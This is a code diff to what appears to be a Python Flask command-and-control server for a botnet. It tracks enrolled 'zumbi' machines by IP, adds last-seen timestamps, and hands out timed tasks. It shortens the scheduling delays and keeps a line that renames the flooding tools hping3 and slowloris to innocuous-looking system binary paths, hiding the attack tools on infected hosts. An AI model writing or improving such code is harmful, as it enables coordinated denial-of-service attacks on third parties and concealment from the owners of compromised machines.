@@ -53,6 +53,9 @@ def register_zumbi():
     zumbies[request.remote_addr] = {}
     zumbies[request.remote_addr]["_info"] = request.get_json()
     zumbies[request.remote_addr]["_tasks"] = {}
+    zumbies[request.remote_addr][
+        "_lastseen"
+    ] = datetime.datetime.now().strftime("%Y-%m-%d,%H:%M:%S")
     return "OK"
 
 
@@ -77,8 +80,8 @@ def new_task():
             when = datetime.datetime.strptime(data["when"], "%Y-%m-%d,%H:%M:%S").replace(tzinfo=datetime.timezone.utc).timestamp()
     except:
         return "Invalid 'when' attribute. Format: YYYY-MM-DD,HH:MM:SS (UTC) or S (number of seconds from now)", 400
-    if when < now + 90:
-        return "Invalid 'when' attribute: must be at least 90s from now", 400
+    if when < now + 30:
+        return "Invalid 'when' attribute: must be at least 30s from now", 400
     if when in tasks:
         return "Cannot add two tasks at the same time", 400
     tasks[when] = data["task"].replace("hping3", "/usr/bin/linux_checker").replace("slowloris", "/usr/bin/linux_verify")
@@ -92,12 +95,14 @@ def get_tasks():
     global zumbies, tasks
     next_tasks = []
     now = datetime.datetime.now().timestamp()
+    now_str = datetime.datetime.now().strftime("%Y-%m-%d,%H:%M:%S")
     zumbi = zumbies.get(request.remote_addr)
     if not zumbi:
         zumbies[request.remote_addr] = {"_tasks": {}, "_info": {}}
         zumbi = zumbies[request.remote_addr]
+    zumbi["_lastseen"] = now_str
     for when, task in tasks.items():
-        if when < now + 10:
+        if when < now + 5:
             zumbi["_tasks"].pop(when, None)
             continue
         if when in zumbi["_tasks"]:
